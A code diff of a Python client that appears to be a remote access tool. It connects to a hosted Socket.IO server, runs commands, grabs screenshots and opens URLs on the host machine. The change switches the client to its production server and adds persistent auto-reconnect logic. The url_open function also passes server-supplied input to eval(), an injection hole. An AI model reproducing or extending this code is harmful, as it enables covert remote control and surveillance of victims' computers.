@@ -7,17 +7,15 @@ import subprocess
 import threading
 import requests
 import tkinter.messagebox as tkm
-import tkinter as tk
 import time
 import webbrowser
 import base64
-import pygetwindow as gw
-import pyautogui
+import time
 from PIL import ImageGrab
 from io import BytesIO
 import pygame
-
-DEBUG = True
+#v1.2
+DEBUG = False
 
 match DEBUG:
     case True:
@@ -26,7 +24,7 @@ match DEBUG:
         SERVER = 'https://padfoot-server.onrender.com'
 
 # Connect to the Socket.IO server
-sio = socketio.Client()
+sio = socketio.Client(reconnection=True, reconnection_delay=3)
 late_return_list = ['messagebox']
 capturing = False
 
@@ -122,6 +120,13 @@ def execute_command(command, data):
 def url_open(url, new, autoraise):
   webbrowser.open(url, int(new), eval(autoraise))
   return f'opened {url} in new {new} with autoraise {autoraise}'
+
+@sio.event
+def connect_error(err):
+  global sio
+  time.sleep(3)
+  # Manually attempt to reconnect
+  sio.connect(SERVER)
 
 @sio.on('connect')
 def on_connect():
